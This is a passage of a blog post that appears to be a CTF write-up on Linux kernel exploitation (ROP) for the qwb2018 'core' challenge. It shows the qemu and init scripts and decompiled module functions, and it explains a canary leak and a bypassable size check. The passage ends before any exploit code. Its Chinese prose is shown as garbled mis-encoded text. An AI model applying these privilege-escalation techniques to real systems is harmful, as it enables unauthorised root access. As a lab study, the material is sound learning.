<!doctype html>
<html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>kernel_pwn ROP - An9Ela</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="An9Ela"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="An9Ela"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="kernel é€šå¸¸ä¸€ä¸ªå†…æ ¸ç”±è´Ÿè´£å“åº”ä¸­æ–­çš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†å¤šä¸ªè¿›ç¨‹ä»è€Œåˆ†äº«å¤„ç†å™¨æ—¶é—´çš„è°ƒåº¦ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜ç®¡ç†ç¨‹åºï¼Œè¿›ç¨‹é—´é€šè®¯ç­‰ç³»ç»ŸæœåŠ¡ç¨‹åºå…±åŒç»„æˆã€‚  â€“linuxå†…æ ¸è®¾è®¡ä¸å®ç°  ä¸€ç›´æƒ³å­¦kernel pwnï¼Œä½†è¿Ÿè¿Ÿæ²¡æœ‰å¼€å§‹ï¼ˆæ‡’ğŸ¤¦ï¼‰ã€‚æœ€è¿‘åˆå¿ƒè¡€æ¥æ½®ï¼Œç¿»å¼€äº†linuxå†…æ ¸è®¾è®¡ä¸å®ç°è¿™æœ¬ä¹¦ï¼Œå‡†å¤‡çœ‹è¿™æœ¬æ¥å…¥é—¨kernelã€‚è¿™å°†ä¼šæ˜¯ä¸€ä¸ªç³»åˆ—ï¼Œè®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼ˆè¯»ä¹¦ç¬”è®°+ke"><meta property="og:type" content="article"><meta property="og:title" content="kernel_pwn ROP"><meta property="og:url" content="https://github.com/CodingAngela/CodingAngela.github.io.git/2020/11/07/kernel_pwn(1)/"><meta property="og:site_name" content="An9Ela"><meta property="og:description" content="kernel é€šå¸¸ä¸€ä¸ªå†…æ ¸ç”±è´Ÿè´£å“åº”ä¸­æ–­çš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†å¤šä¸ªè¿›ç¨‹ä»è€Œåˆ†äº«å¤„ç†å™¨æ—¶é—´çš„è°ƒåº¦ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜ç®¡ç†ç¨‹åºï¼Œè¿›ç¨‹é—´é€šè®¯ç­‰ç³»ç»ŸæœåŠ¡ç¨‹åºå…±åŒç»„æˆã€‚  â€“linuxå†…æ ¸è®¾è®¡ä¸å®ç°  ä¸€ç›´æƒ³å­¦kernel pwnï¼Œä½†è¿Ÿè¿Ÿæ²¡æœ‰å¼€å§‹ï¼ˆæ‡’ğŸ¤¦ï¼‰ã€‚æœ€è¿‘åˆå¿ƒè¡€æ¥æ½®ï¼Œç¿»å¼€äº†linuxå†…æ ¸è®¾è®¡ä¸å®ç°è¿™æœ¬ä¹¦ï¼Œå‡†å¤‡çœ‹è¿™æœ¬æ¥å…¥é—¨kernelã€‚è¿™å°†ä¼šæ˜¯ä¸€ä¸ªç³»åˆ—ï¼Œè®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼ˆè¯»ä¹¦ç¬”è®°+ke"><meta property="og:image" content="https://github.com/img/og_image.png"><meta property="article:published_time" content="2020-11-07T14:00:20.000Z"><meta property="article:modified_time" content="2020-11-07T14:18:08.205Z"><meta property="article:author" content="An9Ela"><meta property="article:tag" content="CTF"><meta property="article:tag" content="KERNEL"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://github.com/CodingAngela/CodingAngela.github.io.git/2020/11/07/kernel_pwn(1)/"},"headline":"kernel_pwn ROP","image":["https://github.com/img/og_image.png"],"datePublished":"2020-11-07T14:00:20.000Z","dateModified":"2020-11-07T14:18:08.205Z","author":{"@type":"Person","name":"An9Ela"},"publisher":{"@type":"Organization","name":"An9Ela","logo":{"@type":"ImageObject"}},"description":"kernel é€šå¸¸ä¸€ä¸ªå†…æ ¸ç”±è´Ÿè´£å“åº”ä¸­æ–­çš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†å¤šä¸ªè¿›ç¨‹ä»è€Œåˆ†äº«å¤„ç†å™¨æ—¶é—´çš„è°ƒåº¦ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜ç®¡ç†ç¨‹åºï¼Œè¿›ç¨‹é—´é€šè®¯ç­‰ç³»ç»ŸæœåŠ¡ç¨‹åºå…±åŒç»„æˆã€‚  â€“linuxå†…æ ¸è®¾è®¡ä¸å®ç°  ä¸€ç›´æƒ³å­¦kernel pwnï¼Œä½†è¿Ÿè¿Ÿæ²¡æœ‰å¼€å§‹ï¼ˆæ‡’ğŸ¤¦ï¼‰ã€‚æœ€è¿‘åˆå¿ƒè¡€æ¥æ½®ï¼Œç¿»å¼€äº†linuxå†…æ ¸è®¾è®¡ä¸å®ç°è¿™æœ¬ä¹¦ï¼Œå‡†å¤‡çœ‹è¿™æœ¬æ¥å…¥é—¨kernelã€‚è¿™å°†ä¼šæ˜¯ä¸€ä¸ªç³»åˆ—ï¼Œè®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼ˆè¯»ä¹¦ç¬”è®°+ke"}</script><link rel="canonical" href="https://github.com/CodingAngela/CodingAngela.github.io.git/2020/11/07/kernel_pwn(1)/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">An9Ela</a></div><div class="navbar-menu"><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Gepostet vor&nbsp;<time dateTime="2020-11-07T14:00:20.000Z" title="2020-11-7 10:00:20 â”œF10: PMâ”¤">2020-11-07</time></span><span class="level-item">Aktualisiert vor&nbsp;<time dateTime="2020-11-07T14:18:08.205Z" title="2020-11-7 10:18:08 â”œF10: PMâ”¤">2020-11-07</time></span></div></div><h1 class="title is-3 is-size-4-mobile">kernel_pwn ROP</h1><div class="content"><h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><blockquote>
<p>é€šå¸¸ä¸€ä¸ªå†…æ ¸ç”±è´Ÿè´£å“åº”ä¸­æ–­çš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†å¤šä¸ªè¿›ç¨‹ä»è€Œåˆ†äº«å¤„ç†å™¨æ—¶é—´çš„è°ƒåº¦ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜ç®¡ç†ç¨‹åºï¼Œè¿›ç¨‹é—´é€šè®¯ç­‰ç³»ç»ŸæœåŠ¡ç¨‹åºå…±åŒç»„æˆã€‚  â€“linuxå†…æ ¸è®¾è®¡ä¸å®ç°</p>
</blockquote>
<p>ä¸€ç›´æƒ³å­¦kernel pwnï¼Œä½†è¿Ÿè¿Ÿæ²¡æœ‰å¼€å§‹ï¼ˆæ‡’ğŸ¤¦ï¼‰ã€‚æœ€è¿‘åˆå¿ƒè¡€æ¥æ½®ï¼Œç¿»å¼€äº†<code>linuxå†…æ ¸è®¾è®¡ä¸å®ç°</code>è¿™æœ¬ä¹¦ï¼Œå‡†å¤‡çœ‹è¿™æœ¬æ¥å…¥é—¨kernelã€‚è¿™å°†ä¼šæ˜¯ä¸€ä¸ªç³»åˆ—ï¼Œè®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼ˆè¯»ä¹¦ç¬”è®°+kernel_pwné¢˜ç›®å¤ç°ï¼‰ï¼Œå¸Œæœ›è‡ªå·±å¯ä»¥åšæŒä¸‹å»ğŸƒã€‚</p>
<span id="more"></span>
<p>kernelé¡¾åæ€ä¹‰æ˜¯æ“ä½œçš„æ ¸å¿ƒï¼Œå®ƒå…¶å®èµ·åˆ°äº†ä¸€ä¸ªæ‰¿ä¸Šï¼ˆç”¨æˆ·ç©ºé—´ï¼‰å¯ä¸‹ï¼ˆç¡¬ä»¶è®¾å¤‡ï¼‰çš„ä½œç”¨ã€‚åº”ç”¨ç¨‹åºé€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥ä¸å†…æ ¸é€šä¿¡ï¼Œå†…æ ¸é€šè¿‡å¤„ç†ä¸­æ–­ï¼ˆé€šè¿‡ä¸­æ–­å·æ‰¾ä¸­æ–­æœåŠ¡ç¨‹åºï¼‰æ¥ç®¡ç†ç³»ç»Ÿçš„ç¡¬ä»¶è®¾å¤‡ã€‚<br>æ³¨æ„ï¼šå¾ˆå¤šæ“ä½œç³»ç»Ÿçš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼ŒåŒ…æ‹¬linuxï¼Œéƒ½ä¸åœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼›è€Œæ˜¯åœ¨ä¸“é—¨çš„ä¸­æ–­ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä¸æ‰€æœ‰è¿›ç¨‹éƒ½æ— å…³ã€‚</p>
<h4 id="kernel-pwn-ROP"><a href="#kernel-pwn-ROP" class="headerlink" title="kernel_pwn_ROP"></a>kernel_pwn_ROP</h4><blockquote>
<p>é¢˜ç›®æ¥è‡ªqwd2018_coreã€‚</p>
</blockquote>
<p>å°±ctfé‡Œkernel pwnè€Œè¨€æˆ‘ä»¬æ‰€è¦åšçš„å°±æ˜¯ææƒï¼ˆå¾—åˆ°ä¸€ä¸ªrootæƒé™çš„è¿›ç¨‹ï¼‰ã€‚æŒ–æ˜å‡ºå­˜åœ¨äºkernelæ¨¡å—é‡Œçš„æ¼æ´å¹¶é€šè¿‡ç”¨æˆ·æ€çš„ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨è¿›åˆ°å†…æ ¸æ€ä¸­å»è§¦å‘æ¼æ´ä»è€Œåˆ°è¾¾ææƒçš„ç›®çš„ã€‚<br>ç›´æ¥æ’¸é¢˜âœ”<br>è§£å‹ä¹‹åå¯ä»¥çœ‹åˆ°è¿™äº›æ–‡ä»¶ï¼š<br>bzImageï¼šå‹ç¼©åçš„å†…æ ¸é•œåƒ<br>vmlinuxï¼šç¼–è¯‘å‡ºçš„åŸå§‹å†…æ ¸æ–‡ä»¶ï¼Œæ²¡æœ‰è¢«å‹ç¼©è€Œä¸”æ˜¯é™æ€è¿æ¥çš„ã€‚<br>.shï¼šqemuçš„å¯åŠ¨è„šæœ¬<br>.cpioï¼šæ‰“åŒ…åçš„æ–‡ä»¶ç³»ç»Ÿ</p>
<p>æˆ‘ä»¬é¦–å…ˆçœ‹ä¸‹.shæ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>è§£é‡Šä¸‹å‚æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-m æŒ‡å®šå†…å­˜(RAM)å¤§å°</span><br><span class="line">-kernel æŒ‡å®šå†…æ ¸é•œåƒ</span><br><span class="line">-initrd æŒ‡å®šå†…æ ¸å¯åŠ¨çš„æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">-qppend é™„åŠ é€‰é¡¹ æŒ‡å®šno kaslrå¯ä»¥å…³é—­åœ°å€éšæœºåŒ–</span><br><span class="line">-s ç›¸å½“äº-gdb tcp::1234ï¼Œå¯ä»¥ç”¨gdb ./vmlinuxè°ƒè¯•</span><br><span class="line">-smp ç”¨äºå£°æ˜æ‰€æœ‰å¯èƒ½ç”¨åˆ°çš„cpus, i.e. sockets cores threads = maxcpus.</span><br><span class="line">-cpu è®¾ç½®CPUçš„å®‰å…¨é€‰é¡¹</span><br></pre></td></tr></table></figure>

<p>ä¿æŠ¤æœºåˆ¶ï¼š<br>å¸¸è§çš„æœ‰kaslrï¼ˆåœ°å€éšæœºåŒ–ï¼‰ï¼Œsmep(å†…æ ¸æ€ä¸å¯æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç )ï¼Œsmap(å†…æ ¸æ€ä¸å¯è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®)ã€‚</p>
<p>è§£é¢˜è¿‡ç¨‹ï¼š<br>æ‹¿åˆ°è¿™äº›æ–‡ä»¶åé¦–å…ˆè¦åšçš„å°±æ˜¯è§£åŒ….cpioæ–‡ä»¶ï¼Œä½†ä¸è¦åœ¨å…±äº«æ–‡ä»¶å¤¹ä¸‹è¿›è¡Œæ­¤æ“ä½œï¼Œä¼šå¯¼è‡´è§£åŒ…çš„è½¯é“¾æ¥å‡ºé”™ã€‚æˆ‘ä¸€èˆ¬æ˜¯è¿™æ ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cp give_to_player /home/an9ela/kernel</span><br><span class="line">cd /home/an9ela/kernel/give_to_player</span><br><span class="line">mkdir core</span><br><span class="line">mv core.cpio core.cpio.gz</span><br><span class="line">mv core.cpio.gz ./core</span><br><span class="line">cd core</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpiow  //è§£åŒ…æ“ä½œ</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; ../core.cpio //æ‰“åŒ…æ“ä½œï¼Œè¿™é¢˜ç»™äº†gen_cpio.shç›´æ¥./gen_cpio core.cpio</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿä¹‹åé¦–å…ˆè¦çœ‹çš„å°±æ˜¯Initæ–‡ä»¶äº†ï¼Œè¿™ä¸ªæ˜¯åˆå§‹åŒ–å†…æ ¸æ—¶æ‰€è¿›è¡Œçš„æ“ä½œâ€œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms    //å¤‡ä»½äº†kallsymsåˆ°tmpæ–‡ä»¶å¤¹ä¸‹</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict  //å³æˆ‘ä»¬ä¸èƒ½é€šè¿‡/proc/kallsymsè·å¾—å‡½æ•°åœ°å€ï¼Œä½†/tmp/kallsymsæ˜¯ä¸å—å½±å“çš„</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict //æ— æ³•é€šè¿‡dmesgæŸ¥çœ‹å†…æ ¸çš„è¾“å‡º</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko    //æ’å…¥core.koæ¨¡å—ï¼Œè¯¥æ¨¡å—ä¹Ÿå³æˆ‘ä»¬è¦é‡ç‚¹åˆ†æçš„æ¨¡å—</span><br><span class="line">poweroff -d 120 -f &amp;  //è¿™å¥è®¾ç½®äº†120sè‡ªåŠ¨å…³æœºï¼Œä¸ºä¸å½±å“è°ƒè¯•å¯ä»¥åˆ æ‰</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh   //æˆ‘ä»¬çš„shellçš„uidgidä¸º1000ï¼Œrootä¸º0</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±è¦åˆ†æcore.koæ¨¡å—äº†ï¼Œå¯ä»¥ç”¨idaæ‰“å¼€ã€‚<br>é¦–å…ˆæŸ¥çœ‹init_moduleå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåœ¨æ¨¡å—åŠ è½½æ—¶æ‰§è¡Œã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥å‡½æ•°è°ƒç”¨proc_createåˆ›å»ºäº†åä¸ºcoreçš„è™šæ‹Ÿæ–‡ä»¶ï¼Œåº”ç”¨å±‚é€šè¿‡è¯»å†™æ”¹æ–‡ä»¶å®ç°ä¸å†…æ ¸çš„äº¤äº’ã€‚<br>å…¶ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°file_operationså­˜å‚¨äº†å†…æ ¸æ¨¡å—æä¾›çš„å¯¹è®¾å¤‡è¿›è¡Œå„ç§æ“ä½œçš„å‡½æ•°æŒ‡é’ˆï¼Œå¯¹äºç”¨æˆ·æ€è€Œè¨€ä¹Ÿå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡coreæ–‡ä»¶èƒ½è¿›è¡Œé‚£äº›æ“ä½œã€‚<br>ç‚¹è¿›å»fop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000438                 dq offset core_write</span><br><span class="line">.data:0000000000000468                 dq offset core_ioctl</span><br><span class="line">.data:0000000000000498                 dq offset core_release</span><br></pre></td></tr></table></figure>
<p>å¯è§èƒ½æ‰§è¡Œçš„æ“ä½œä¸ºwrite,ioctl,release</p>
<p>æ¥ä¸‹æ¥æ˜¯core_ioctlå‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line"></span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>int ioctl(int fd, ind cmd, â€¦);æ˜¯è®¾å¤‡é©±åŠ¨ç¨‹åºä¸­å¯¹è®¾å¤‡çš„ioé€šé“è¿›è¡Œç®¡ç†çš„å‡½æ•°ã€‚å…¶ä¸­fdæ˜¯ç”¨æˆ·ç¨‹åºæ‰“å¼€è®¾å¤‡æ—¶ä½¿ç”¨openå‡½æ•°è¿”å›çš„æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œcmdæ˜¯ç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„æ§åˆ¶å‘½ä»¤ã€‚<br>ioctlæ˜¯æ–‡ä»¶ç»“æ„ä¸­çš„ä¸€ä¸ªå±æ€§åˆ†é‡ï¼Œå¦‚æœä½ çš„é©±åŠ¨ç¨‹åºæä¾›äº†å¯¹ioctlçš„æ”¯æŒï¼Œç”¨æˆ·å°±å¯ä»¥åœ¨ç”¨æˆ·ç¨‹åºä¸­ä½¿ç”¨ioctlå‡½æ•°å®ç°å¯¹è®¾å¤‡ioé€šé“çš„æ§åˆ¶ã€‚<br>æ„æ€å°±æ˜¯å¦‚æœlkmä¸­æä¾›äº†ioctlåŠŸèƒ½ï¼ˆæ¯”å¦‚ä¸Šé¢çš„è¿™ä¸ªå‡½æ•°ï¼‰ï¼Œå¹¶ä¸”å®ç°äº†å¯¹åº”æŒ‡ä»¤çš„æ“ä½œï¼Œé‚£ä¹ˆåœ¨ç”¨æˆ·æ€ä¸­ï¼Œé€šè¿‡è¿™ä¸ªé©±åŠ¨ç¨‹åºï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ioctlå‡½æ•°æ¥ç›´æ¥è°ƒç”¨æ¨¡å—ä¸­çš„æ“ä½œã€‚</p>
<p>è€Œè¿™é‡Œå°±æä¾›äº†ioctlåŠŸèƒ½ï¼Œç»§ç»­åˆ†æcore_read()ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="type">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(v1, (<span class="type">char</span> *)&amp;v5 + off, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>  copy_to_user()å‡½æ•°ä¸­å°†v5+offä¸­çš„0x40é•¿åº¦çš„æ•°æ®æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå…¶ä¸­offæ˜¯bssä¸Šçš„å…¨å±€å˜é‡ã€‚<br>  è€Œcase 0x6677889Cå°±ç»™äº†æˆ‘ä»¬æ§åˆ¶offçš„æœºä¼šï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨é€šè¿‡æ§åˆ¶off&#x3D;0x40æ¥leak canaryã€‚</p>
<p>  core_copy_funcå‡½æ•°ï¼š<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  __int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(&amp;v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span 